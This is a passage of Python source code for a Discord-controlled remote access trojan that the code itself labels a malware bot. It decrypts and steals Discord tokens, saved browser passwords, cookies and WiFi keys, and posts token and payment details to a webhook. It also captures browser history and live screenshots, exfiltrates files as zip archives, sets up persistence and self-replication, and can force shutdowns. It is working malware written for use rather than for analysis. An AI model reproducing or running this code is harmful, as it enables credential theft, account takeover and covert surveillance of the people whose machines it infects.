            f"📋 File Information:",
            f"```yaml",
            f"Name: {os.path.basename(file_path)}",
            f"Path: {os.path.dirname(file_path)}",
            f"Size: {size_str}",
            f"Created: {created.strftime('%Y-%m-%d %H:%M:%S')}",
            f"Modified: {modified.strftime('%Y-%m-d %H:%M:%S')}",
            f"Type: {'Directory' if os.path.isdir(file_path) else 'File'}",
        ]
        
        info.append(f"```")
        
        return "\n".join(info)
    except Exception as e:
        return f"❌ Error getting file info: {str(e)}"

async def downloadall_files(message, path="."):
    try:
        if not os.path.exists(path):
            await message.channel.send(f"❌ Path does not exist: `{path}`")
            return
        
        if path == ".":
            path = os.getcwd()
        
        files = []
        total_size = 0
        file_count = 0
        
        for item in os.listdir(path):
            item_path = os.path.join(path, item)
            if os.path.isfile(item_path):
                try:
                    size = os.path.getsize(item_path)
                    total_size += size
                    file_count += 1
                    files.append(item_path)
                except:
                    continue
        
        if file_count == 0:
            await message.channel.send(f"❌ No files available for download in: `{path}`")
            return
        
        max_size_mb = 50
        total_size_mb = total_size / (1024 * 1024)
        
        if total_size_mb > max_size_mb:
            await message.channel.send(
                f"❌ Total file size exceeds download limit:\n"
                f"📂 Directory: `{path}`\n"
                f"📊 Files: {file_count}\n"
                f"💾 Total Size: {total_size_mb:.1f}MB\n"
                f"⚠️ Limit: {max_size_mb}MB\n\n"
                f"Try:\n"
                f"• Download files individually using `$download <filename>`\n"
                f"• Navigate to a directory with fewer/smaller files"
            )
            return
        
        await message.channel.send("🔄 Creating zip archive...")
        
        temp_dir = tempfile.gettempdir()
        zip_filename = os.path.join(temp_dir, f"all_files_{int(time.time())}.zip")
        
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            files_added = 0
            for file_path in files:
                try:
                    arcname = os.path.basename(file_path)
                    zipf.write(file_path, arcname)
                    files_added += 1
                except:
                    continue
        
        if not os.path.exists(zip_filename):
            await message.channel.send("❌ Failed to create zip archive.")
            return
        
        zip_size = os.path.getsize(zip_filename)
        
        with open(zip_filename, 'rb') as f:
            await message.channel.send(
                f"✅ All files downloaded successfully!\n"
                f"📦 Zip Archive: `all_files.zip`\n"
                f"📊 Files Added: {files_added} of {file_count}\n"
                f"💾 Size: {zip_size/(1024*1024):.1f}MB",
                file=File(f, filename="all_files.zip")
            )
        
        os.remove(zip_filename)
            
    except Exception as e:
        await message.channel.send(f"❌ Error in downloadall: `{str(e)}`")

def get_browser_history(browser_name, history_path):
    history_entries = []
    
    try:
        if not os.path.exists(history_path):
            return history_entries
        
        temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_history_temp.db")
        shutil.copy2(history_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        query = """
        SELECT urls.url, urls.title, urls.visit_count, 
               datetime(urls.last_visit_time/1000000-11644473600, 'unixepoch') as last_visit
        FROM urls 
        ORDER BY urls.last_visit_time DESC 
        LIMIT 100
        """
        
        cursor.execute(query)
        
        for row in cursor.fetchall():
            url = row[0]
            title = row[1] if row[1] else "No Title"
            visit_count = row[2]
            last_visit = row[3]
            
            history_entries.append({
                'browser': browser_name,
                'url': url,
                'title': title[:100] + '...' if len(title) > 100 else title,
                'visit_count': visit_count,
                'last_visit': last_visit
            })
        
        conn.close()
        os.remove(temp_db)
        
    except Exception as e:
        pass
    
    return history_entries

def get_chrome_history():
    history_path = LOCAL + "\\Google\\Chrome\\User Data\\Default\\History"
    return get_browser_history("Chrome", history_path)

def get_edge_history():
    history_path = LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\History"
    return get_browser_history("Microsoft Edge", history_path)

def get_default_browser_history():
    try:
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                               r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice") as key:
                browser_progid, _ = winreg.QueryValueEx(key, "ProgId")
            
            if "Chrome" in browser_progid:
                return get_chrome_history(), "Chrome"
            elif "Edge" in browser_progid:
                return get_edge_history(), "Microsoft Edge"
            elif "Firefox" in browser_progid:
                return [], "Firefox (not supported)"
            else:
                return [], f"Unknown browser: {browser_progid}"
        except:
            pass
        
        chrome_history = get_chrome_history()
        if chrome_history:
            return chrome_history, "Chrome"
        
        edge_history = get_edge_history()
        if edge_history:
            return edge_history, "Microsoft Edge"
        
        return [], "No browser history found"
        
    except Exception as e:
        return [], f"Error: {str(e)}"

def create_history_csv(history_entries, filename="browser_history"):
    if not history_entries:
        return None
    
    output = io.StringIO()
    writer = csv.writer(output)
    
    writer.writerow(['Browser', 'URL', 'Title', 'Visit Count', 'Last Visit'])
    
    for entry in history_entries[:500]:
        writer.writerow([
            entry['browser'],
            entry['url'],
            entry['title'],
            entry['visit_count'],
            entry['last_visit']
        ])
    
    csv_content = output.getvalue()
    output.close()
    
    return csv_content

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens

def getkey(path):
    try:
        with open(path + "\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            return key
    except:
        return None

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

def steal_discord_tokens_with_ui():
    checked = []
    ip_address = getip()
    user_sid = user_system.get_sid()
    
    tokens = []
    
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                # Decrypt the token
                token = AES.new(
                    win32crypt.CryptUnprotectData(
                        base64.b64decode(getkey(path))[5:], 
                        None, None, None, 0
                    )[1], 
                    AES.MODE_GCM, 
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
                ).decrypt(
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:]
                )[:-16].decode()
                
                if token in checked:
                    continue
                checked.append(token)

                # Check if token is valid
                res = urllib.request.urlopen(
                    urllib.request.Request(
                        'https://discord.com/api/v10/users/@me', 
                        headers=getheaders(token)
                    ), 
                    timeout=10
                )
                
                if res.getcode() != 200:
                    continue
                    
                res_json = json.loads(res.read().decode())

                # Get badges
                badges = ""
                flags = res_json.get('flags', 0)
                if flags == 64 or flags == 96:
                    badges += "Bravery "
                if flags == 128 or flags == 160:
                    badges += "Brilliance "
                if flags == 256 or flags == 288:
                    badges += "Balance "

                # Get guilds info
                params = urllib.parse.urlencode({"with_counts": True})
                guilds_res = json.loads(
                    urllib.request.urlopen(
                        urllib.request.Request(
                            f'https://discordapp.com/api/v6/users/@me/guilds?{params}', 
                            headers=getheaders(token)
                        ), 
                        timeout=10
                    ).read().decode()
                )
                
                guilds = len(guilds_res)
                guild_infos = ""
                admin_guilds = 0

                for guild in guilds_res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        admin_guilds += 1
                        guild_detail = json.loads(
                            urllib.request.urlopen(
                                urllib.request.Request(
                                    f'https://discordapp.com/api/v6/guilds/{guild["id"]}', 
                                    headers=getheaders(token)
                                ), 
                                timeout=10
                            ).read().decode()
                        )
                        
                        vanity = f" | .gg/{guild_detail['vanity_url_code']}" if guild_detail.get('vanity_url_code') else ""
                        guild_infos += f"\n- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"

                if guild_infos == "":
                    guild_infos = "No guilds with admin permissions"

                # Check nitro
                nitro_res = json.loads(
                    urllib.request.urlopen(
                        urllib.request.Request(
                            'https://discordapp.com/api/v6/users/@me/billing/subscriptions', 
                            headers=getheaders(token)
                        ), 
                        timeout=10
                    ).read().decode()
                )
                
                has_nitro = bool(len(nitro_res) > 0)
                exp_date = None
                if has_nitro:
                    badges += "Nitro "
                    exp_date = datetime.datetime.strptime(
                        nitro_res[0]["current_period_end"], 
                        "%Y-%m-%dT%H:%M:%S.%f%z"
                    ).strftime('%d/%m/%Y at %H:%M:%S')

                # Check boosts
                boost_res = json.loads(
                    urllib.request.urlopen(
                        urllib.request.Request(
                            'https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', 
                            headers=getheaders(token)
                        ), 
                        timeout=10
                    ).read().decode()
                )
                
                available = 0
                boost_info = ""
                for boost in boost_res:
                    cooldown = datetime.datetime.strptime(
                        boost["cooldown_ends_at"], 
                        "%Y-%m-%dT%H:%M:%S.%f%z"
                    )
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        available += 1
                        boost_info += f"- Available now\n"
                    else:
                        boost_info += f"- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"

                if available > 0:
                    badges += "Boost "

                # Check payment methods
                payment_res = json.loads(
                    urllib.request.urlopen(
                        urllib.request.Request(
                            'https://discordapp.com/api/v6/users/@me/billing/payment-sources', 
                            headers=getheaders(token)
                        ), 
                        timeout=10
                    ).read().decode()
                )
                
                payment_methods = len(payment_res)
                valid_methods = sum(1 for x in payment_res if not x['invalid'])
                payment_types = []
                for x in payment_res:
                    if x['type'] == 1:
                        payment_types.append("CreditCard")
                    elif x['type'] == 2:
                        payment_types.append("PayPal")
                payment_types_str = ", ".join(payment_types) if payment_types else "None"

                # Get current user info
                current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
                private_ip = get_private_ip()
                pc_name = os.getenv('COMPUTERNAME', 'Unknown')
                username = os.getenv('UserName', 'Unknown')
                
                # Create embed description
                embed_description = (
                    "**User Information:**\n"
                    f"```yaml\n"
                    f"Username: {res_json['username']}\n"
                    f"User ID: {res_json['id']}\n"
                    f"Email: {res_json.get('email', 'N/A')}\n"
                    f"Phone: {res_json.get('phone', 'N/A')}\n"
                    f"MFA Enabled: {res_json.get('mfa_enabled', False)}\n"
                    f"Verified: {res_json.get('verified', False)}\n"
                    f"Locale: {res_json.get('locale', 'N/A')}\n"
                    f"Flags: {flags}\n"
                    f"Badges: {badges.strip() if badges else 'None'}\n"
                    f"```\n\n"
                    
                    "**Account Security:**\n"
                    f"```yaml\n"
                    f"Total Guilds: {guilds}\n"
                    f"Admin Guilds: {admin_guilds}\n"
                    f"{guild_infos}\n"
                    f"```\n\n"
                    
                    "**Nitro Information:**\n"
                    f"```yaml\n"
                    f"Has Nitro: {has_nitro}\n"
                    f"Expiration Date: {exp_date if exp_date else 'N/A'}\n"
                    f"Boosts Available: {available}\n"
                    f"{boost_info if boost_info else ''}\n"
                    f"```\n\n"
                    
                    "**Payment Methods:**\n"
                    f"```yaml\n"
                    f"Total Methods: {payment_methods}\n"
                    f"Valid Methods: {valid_methods}\n"
                    f"Types: {payment_types_str}\n"
                    f"```\n\n"
                    
                    "**System Information:**\n"
                    f"```yaml\n"
                    f"Public IP: {ip_address}\n"
                    f"Private IP: {private_ip}\n"
                    f"Username: {username}\n"
                    f"PC Name: {pc_name}\n"
                    f"User SID: {user_sid}\n"
                    f"Token Location: {platform}\n"
                    f"```\n\n"
                    
                    "**Token:**\n"
                    f"```yaml\n"
                    f"{token}\n"
                    f"```"
                )

                # Get avatar URL
                avatar_url = None
                if res_json.get('avatar'):
                    avatar_hash = res_json['avatar']
                    user_id = res_json['id']
                    if avatar_hash.startswith('a_'):
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.gif"
                    else:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png"
                else:
                    avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png"

                # Create embed
                embed_user = {
                    'embeds': [
                        {
                            'title': f"new regitered user: {res_json['username']}",
                            'description': embed_description,
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Prakash"
                            },
                            'thumbnail': {
                                'url': avatar_url
                            },
                            'timestamp': datetime.datetime.now(datetime.timezone.utc).isoformat()
                        }
                    ],
                    "username": "hehe",
                    "avatar_url": "https://images-ext-1.discordapp.net/external/BhDO3xpLncmJxbbQ7yYM8WNg5YuX1gLjLCvyFy2Re-Y/https/cdn.discordapp.com/avatars/1374741811523751946/e85891c0649f47142b2d9f336b027f5c.png?format=webp&quality=lossless"
                }

                # Send to webhook
                urllib.request.urlopen(
                    urllib.request.Request(
                        WEBHOOK_URL, 
                        data=json.dumps(embed_user).encode('utf-8'), 
                        headers=getheaders(), 
                        method='POST'
                    ), 
                    timeout=10
                )
                
                # Add token to list for bot response
                tokens.append({
                    'username': res_json['username'],
                    'id': res_json['id'],
                    'token': token,
                    'valid': True
                })
                
            except Exception as e:
                continue
    
    # Update user data
    current_user = next((u for u in user_system.registered_users if u['id'] == user_system.current_user_id), None)
    if current_user:
        current_user['tokens_found'] = len(tokens)
        user_system.save_users()
    
    return tokens

def steal_discord_tokens():
    valid_tokens = []
    
    for browser_name, path in PATHS.items():
        if not os.path.exists(path):
            continue
        
        tokens = gettokens(path)
        for encrypted_token in tokens:
            try:
                token = encrypted_token.replace("\\", "") if encrypted_token.endswith("\\") else encrypted_token
                
                if 'dQw4w9WgXcQ:' in token:
                    try:
                        key = getkey(path)
                        if key:
                            encrypted_key = base64.b64decode(key)[5:]
                            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                            
                            encrypted_value = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
                            nonce = encrypted_value[3:15]
                            ciphertext = encrypted_value[15:-16]
                            
                            cipher = AES.new(master_key, AES.MODE_GCM, nonce)
                            decrypted_token = cipher.decrypt(ciphertext).decode()
                            
                            if decrypted_token:
                                token = decrypted_token
                    except:
                        try:
                            token = win32crypt.CryptUnprotectData(encrypted_token, None, None, None, 0)[1].decode()
                        except:
                            continue
                
                # Check token validity
                headers = getheaders(token)
                req = urllib.request.Request('https://discord.com/api/v10/users/@me', headers=headers)
                response = urllib.request.urlopen(req, timeout=10)
                
                if response.getcode() == 200:
                    user_data = json.loads(response.read().decode())
                    token_info = {
                        'valid': True,
                        'username': user_data.get('username', 'Unknown'),
                        'discriminator': user_data.get('discriminator', '0000'),
                        'id': user_data.get('id', 'Unknown'),
                        'email': user_data.get('email', 'No email'),
                        'phone': user_data.get('phone', 'No phone'),
                        'verified': user_data.get('verified', False),
                        'mfa_enabled': user_data.get('mfa_enabled', False),
                        'token': token
                    }
                    
                    if not any(t['token'] == token for t in valid_tokens):
                        valid_tokens.append(token_info)
                        
            except Exception as e:
                continue
    
    return valid_tokens

def get_browser_passwords(browser_name, data_path, key_path):
    passwords = []
    
    try:
        if not os.path.exists(data_path) or not os.path.exists(key_path):
            return passwords
        
        with open(key_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_passwords_temp.db")
        shutil.copy2(data_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_password = row[2]
            date_created = row[3]
            
            if not url or not username:
                continue
            
            password = None
            try:
                if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                    nonce = encrypted_password[3:15]
                    ciphertext = encrypted_password[15:-16]
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce)
                    password = cipher.decrypt(ciphertext).decode()
                else:
                    password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
            except:
                password = "[DECRYPTION FAILED]"
            
            domain = url.split('/')[2] if '//' in url else url
            
            is_social = any(social_domain in domain.lower() for social_domain in SOCIAL_MEDIA_DOMAINS)
            
            passwords.append({
                'browser': browser_name,
                'url': url,
                'domain': domain,
                'username': username,
                'password': password,
                'date': datetime.datetime.fromtimestamp(date_created).strftime('%Y-%m-%d') if date_created else 'N/A',
                'is_social': is_social,
                'type': 'Browser Password'
            })
        
        conn.close()
        os.remove(temp_db)
        
    except Exception as e:
        pass
    
    return passwords

def get_chrome_passwords():
    data_path = LOCAL + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    key_path = LOCAL + "\\Google\\Chrome\\User Data\\Local State"
    return get_browser_passwords("Chrome", data_path, key_path)

def get_edge_passwords():
    data_path = LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"
    key_path = LOCAL + "\\Microsoft\\Edge\\User Data\\Local State"
    return get_browser_passwords("Microsoft Edge", data_path, key_path)

def get_brave_passwords():
    data_path = LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
    key_path = LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
    return get_browser_passwords("Brave", data_path, key_path)

def get_opera_passwords():
    data_path = ROAMING + "\\Opera Software\\Opera Stable\\Login Data"
    key_path = ROAMING + "\\Opera Software\\Opera Stable\\Local State"
    return get_browser_passwords("Opera", data_path, key_path)

def get_wifi_passwords():
    wifi_passwords = []
    
    try:
        result = subprocess.run(
            ['netsh', 'wlan', 'show', 'profiles'], 
            capture_output=True, text=True, shell=True
        )
        
        profiles = []
        for line in result.stdout.split('\n'):
            if "All User Profile" in line:
                profile_name = line.split(":")[1].strip()
                profiles.append(profile_name)
        
        for profile in profiles:
            try:
                result = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                    capture_output=True, text=True, shell=True
                )
                
                lines = result.stdout.split('\n')
                password = None
                for line in lines:
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break
                
                if password:
                    wifi_passwords.append({
                        'type': 'WiFi',
                        'ssid': profile,
                        'password': password,
                        'username': 'N/A',
                        'domain': 'WiFi Network',
                        'is_social': False,
                        'date': 'N/A'
                    })
            except:
                continue
                
    except Exception as e:
        pass
    
    return wifi_passwords

def steal_all_passwords():
    all_passwords = []
    
    all_passwords.extend(get_chrome_passwords())
    all_passwords.extend(get_edge_passwords())
    all_passwords.extend(get_brave_passwords())
    all_passwords.extend(get_opera_passwords())
    
    all_passwords.extend(get_wifi_passwords())
    
    return all_passwords

def filter_social_media_credentials(credentials):
    social_creds = []
    
    for cred in credentials:
        if cred.get('is_social', False):
            social_creds.append(cred)
        elif any(social_domain in str(cred.get('domain', '')).lower() for social_domain in SOCIAL_MEDIA_DOMAINS):
            cred['is_social'] = True
            social_creds.append(cred)
        elif any(social_domain in str(cred.get('url', '')).lower() for social_domain in SOCIAL_MEDIA_DOMAINS):
            cred['is_social'] = True
            social_creds.append(cred)
    
    return social_creds

def create_password_csv(passwords, filename="passwords"):
    if not passwords:
        return None
    
    output = io.StringIO()
    writer = csv.writer(output)
    
    writer.writerow(['Type', 'Browser/SSID', 'URL/Domain', 'Username', 'Password', 'Date', 'Social Media'])
    
    for cred in passwords:
        writer.writerow([
            cred.get('type', cred.get('browser', 'Unknown')),
            cred.get('browser', cred.get('ssid', 'N/A')),
            cred.get('url', cred.get('domain', 'N/A')),
            cred.get('username', 'N/A'),
            cred.get('password', 'N/A'),
            cred.get('date', 'N/A'),
            'Yes' if cred.get('is_social', False) else 'No'
        ])
    
    csv_content = output.getvalue()
    output.close()
    
    return csv_content

def get_browser_cookies(browser_name, cookie_path, key_path):
    cookies = []
    
    try:
        if not os.path.exists(cookie_path) or not os.path.exists(key_path):
            return cookies
        
        with open(key_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        temp_db = os.path.join(tempfile.gettempdir(), f"{browser_name}_cookies_temp.db")
        shutil.copy2(cookie_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies")
        
        for row in cursor.fetchall():
            host = row[0]
            name = row[1]
            encrypted_value = row[2]
            path = row[3]
            expires = row[4]
            
            value = None
            try:
                if encrypted_value.startswith(b'v10'):
                    nonce = encrypted_value[3:15]
                    ciphertext = encrypted_value[15:-16]
                    cipher = AES.new(master_key, AES.MODE_GCM, nonce)
                    value = cipher.decrypt(ciphertext).decode()
                else:
                    value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
            except:
                value = "[DECRYPTION FAILED]"
            
            is_social = any(social_domain in host.lower() for social_domain in SOCIAL_MEDIA_DOMAINS)
            
            cookies.append({
                'browser': browser_name,
                'domain': host,
                'name': name,
                'value': value,
                'path': path,
                'expires': datetime.datetime.fromtimestamp(expires).strftime('%Y-%m-%d') if expires else 'Session',
                'is_social': is_social
            })
        
        conn.close()
        os.remove(temp_db)
        
    except Exception as e:
        pass
    
    return cookies

def get_social_media_cookies():
    all_cookies = []
    
    chrome_cookie_path = LOCAL + "\\Google\\Chrome\\User Data\\Default\\Cookies"
    chrome_key_path = LOCAL + "\\Google\\Chrome\\User Data\\Local State"
    if os.path.exists(chrome_cookie_path):
        all_cookies.extend(get_browser_cookies("Chrome", chrome_cookie_path, chrome_key_path))
    
    edge_cookie_path = LOCAL + "\\Microsoft\\Edge\\User Data\\Default\\Cookies"
    edge_key_path = LOCAL + "\\Microsoft\\Edge\\User Data\\Local State"
    if os.path.exists(edge_cookie_path):
        all_cookies.extend(get_browser_cookies("Microsoft Edge", edge_cookie_path, edge_key_path))
    
    social_cookies = [c for c in all_cookies if c['is_social']]
    
    return social_cookies

def check_improved_pc_status():
    try:
        cpu_usage = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        disk = psutil.disk_usage('C:\\')
        net_io = psutil.net_io_counters()
        
        boot_time = psutil.boot_time()
        uptime_seconds = time.time() - boot_time
        uptime_str = str(datetime.timedelta(seconds=int(uptime_seconds)))
        
        status_info = {
            "online": check_internet_connection(),
            "uptime": uptime_str,
            "cpu_usage": f"{cpu_usage:.1f}%",
            "memory_usage": f"{memory.percent:.1f}% ({memory.used//(1024**3)}GB/{memory.total//(1024**3)}GB)",
            "disk_usage": f"{disk.percent:.1f}% ({disk.used//(1024**3)}GB/{disk.total//(1024**3)}GB)",
            "network_info": f"Sent: {net_io.bytes_sent/(1024**2):.1f}MB | Recv: {net_io.bytes_recv/(1024**2):.1f}MB",
            "timestamp": datetime.datetime.now().isoformat()
        }
        return status_info
    except Exception as e:
        return {"error": str(e)}

hide_console()

print("=" * 60)
print("INITIALIZING ENHANCED MALWARE BOT")
print("=" * 60)

print("Enhancing stealth measures...")
enhance_stealth()

print("Setting up advanced auto-startup...")
startup_success, methods = add_to_startup_advanced()
if startup_success:
    print(f"Auto-startup configured ({', '.join(methods)})")
else:
    print("Auto-startup configuration failed")

print("Creating self-replicating payload...")
create_self_replicating_payload()

print("Registering device...")
user_data, is_new_user = user_system.register_user()

print("Sending startup notification...")
send_startup_notification(user_data, is_new_user)

print("Sending bot started notification...")
time.sleep(2)

print("=" * 60)
print(f"Device Status: {'NEW DEVICE REGISTERED' if is_new_user else 'DEVICE IS ONLINE'}")
print(f"Device ID: {user_data['id']}")
print(f"PC Name: {user_data['pc_name']}")
print(f"Username: {user_data['username']}")
print(f"User SID: {user_data['system_info']['user_sid']}")
print(f"Private IP: {get_private_ip()}")
print(f"Public IP: {user_data['location'].get('ip', 'Unknown')}")
print(f"Location: {user_data['location'].get('city', 'Unknown')}, {user_data['location'].get('country', 'Unknown')}")
print(f"Total Devices: {len(user_system.registered_users)}")
print("=" * 60)

is_capturing = False
stop_capture = False
current_screenshot_count = 0
countdown_active = False
stop_countdown = False
shutdown_pending = False
restart_pending = False
is_live_mode = False
screenshot_count = 0

intents = discord.Intents.default()
intents.message_content = True
intents.messages = True

bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)

async def capture_screenshots_task(message, num_screenshots):
    global is_capturing, stop_capture, current_screenshot_count
    
    is_capturing = True
    stop_capture = False
    current_screenshot_count = 0
    
    temp_dir = tempfile.gettempdir()
    screenshots_sent = 0
    
    for i in range(num_screenshots):
        if stop_capture:
            break
        
        try:
            screenshot = pyautogui.screenshot()
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}_{i+1}.png"
            filepath = os.path.join(temp_dir, filename)
            
            screenshot.save(filepath)
            
            with open(filepath, 'rb') as f:
                await message.channel.send(
                    f"Screenshot {i+1}/{num_screenshots}",
                    file=File(f, filename=filename)
                )
            
            os.remove(filepath)
            screenshots_sent += 1
            current_screenshot_count = screenshots_sent
            
            if i < num_screenshots - 1 and not stop_capture:
                await asyncio.sleep(1)
                
        except Exception as e:
            continue
    
    is_capturing = False
    stop_capture = False
    
    if stop_capture:
        await message.channel.send(f"Screenshot capture stopped. Sent {screenshots_sent} screenshots.")
    else:
        await message.channel.send(f"Screenshot capture completed. Sent {screenshots_sent} screenshots.")

async def live_screenshot_task(message):
    global is_live_mode, stop_capture, screenshot_count
    
    screenshot_count = 0
    
    while is_live_mode and not stop_capture:
        try:
            screenshot = pyautogui.screenshot()
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"live_screenshot_{timestamp}.png"
            
            temp_dir = tempfile.gettempdir()
            filepath = os.path.join(temp_dir, filename)
            screenshot.save(filepath)
            
            with open(filepath, 'rb') as f:
                await message.channel.send(
                    f"Live Screenshot #{screenshot_count + 1}\n{datetime.datetime.now().strftime('%H:%M:%S')}",
                    file=File(f, filename=filename)
                )
            
            os.remove(filepath)
            screenshot_count += 1
            
            for _ in range(10):
                if not is_live_mode or stop_capture:
                    break
                await asyncio.sleep(1)
                
        except Exception as e:
            await asyncio.sleep(10)
    
    if stop_capture:
        await message.channel.send(f"Live screenshot mode stopped.\nTotal: {screenshot_count}")
    else:
        await message.channel.send(f"Live screenshot mode completed.\nTotal: {screenshot_count}")
    
    is_live_mode = False
    stop_capture = False

async def countdown_task(message, seconds):
    global countdown_active, stop_countdown
    
    countdown_active = True
    stop_countdown = False
    
    await message.channel.send(f"Countdown started for {seconds} seconds...")
    
    remaining = seconds
    while remaining > 0 and not stop_countdown:
        if remaining == 10 or remaining == 30 or remaining == 60 or remaining <= 5:
            await message.channel.send(f"{remaining} seconds remaining...")
        
        await asyncio.sleep(1)
        remaining -= 1
    
    if stop_countdown:
        await message.channel.send("Countdown stopped by user.")
    else:
        await message.channel.send("Countdown finished!")
    
    countdown_active = False
    stop_countdown = False

async def shutdown_pc(message, delay_seconds=60, force=False):
    global shutdown_pending
    
    if shutdown_pending:
        await message.channel.send("Shutdown is already scheduled! Use `$cancel` to cancel.")
        return
    
    shutdown_time = datetime.datetime.now() + datetime.timedelta(seconds=delay_seconds)
    shutdown_timestamp = int(shutdown_time.timestamp())
    
    if force:
        cmd = f"shutdown /s /f /t {delay_seconds}"
        method = "Force Shutdown"
    else:
        cmd = f"shutdown /s /t {delay_seconds}"
        method = "Normal Shutdown"
    
    await message.channel.send(
        f"{method} Scheduled!\n"
        f"Shutdown in: {delay_seconds} seconds\n"
        f"Shutdown at: <t:{shutdown_timestamp}:T>\n"
        f"Use `$cancel` to cancel."
    )
    
    try:
        subprocess.run(cmd, shell=True, capture_output=True)
        shutdown_pending = True
    except Exception as e:
        await message.channel.send(f"❌ Error scheduling shutdown: {str(e)}")

async def restart_pc(message, delay_seconds=60, force=False):
    global restart_pending
    
    if restart_pending:
        await message.channel.send("Restart is already scheduled! Use `$cancel` to cancel.")
        return
    
    restart_time = datetime.datetime.now() + datetime.timedelta(seconds=delay_seconds)
    restart_timestamp = int(restart_time.timestamp())
    
    if force:
        cmd = f"shutdown /r /f /t {delay_seconds}"
        method = "Force Restart"
    else:
        cmd = f"shutdown /r /t {delay_seconds}"
        method = "Normal Restart"
    
    await message.channel.send(
        f"{method} Scheduled!\n"
        f"Restart in: {delay_seconds} seconds\n"
        f"Restart at: <t:{restart_timestamp}:T>\n"
        f"Use `$cancel` to cancel."
    )
    
    try:
        subprocess.run(cmd, shell=True, capture_output=True)
        restart_pending = True
    except Exception as e:
        await message.channel.send(f"❌ Error scheduling restart: {str(e)}")

async def cancel_shutdown_restart(message):
    global shutdown_pending, restart_pending
    
    if not shutdown_pending and not restart_pending:
        await message.channel.send("No shutdown or restart is currently scheduled.")
        return
    
    try:
        subprocess.run("shutdown /a", shell=True, capture_output=True)
        
        cancelled_actions = []
        if shutdown_pending:
            cancelled_actions.append("shutdown")
            shutdown_pending = False
        if restart_pending:
            cancelled_actions.append("restart")
            restart_pending = False
        
        action_text = " and ".join(cancelled_actions)
        await message.channel.send(f"{action_text.capitalize()} has been cancelled!")
        
    except Exception as e:
        await message.channel.send(f"❌ Error cancelling shutdown/restart: {str(e)}")

class EnhancedHelpDropdown(ui.Select):
    def __init__(self):
        options = [
            discord.SelectOption(label="User Management", value="user_commands", description="Manage registered devices"),
            discord.SelectOption(label="System Commands", value="system_commands", description="System monitoring and control"),
            discord.SelectOption(label="Power Control", value="power_commands", description="Shutdown and restart"),
            discord.SelectOption(label="File System", value="file_commands", description="File operations"),
            discord.SelectOption(label="Token Stealing", value="token_commands", description="Steal Discord tokens"),
            discord.SelectOption(label="Password Stealing", value="password_commands", description="Steal passwords and credentials"),
            discord.SelectOption(label="Social Media", value="social_commands", description="Steal social media credentials"),
            discord.SelectOption(label="Browser Data", value="browser_commands", description="Browser history and data"),
            discord.SelectOption(label="Admin Commands", value="admin_commands", description="Admin and PowerShell commands"),
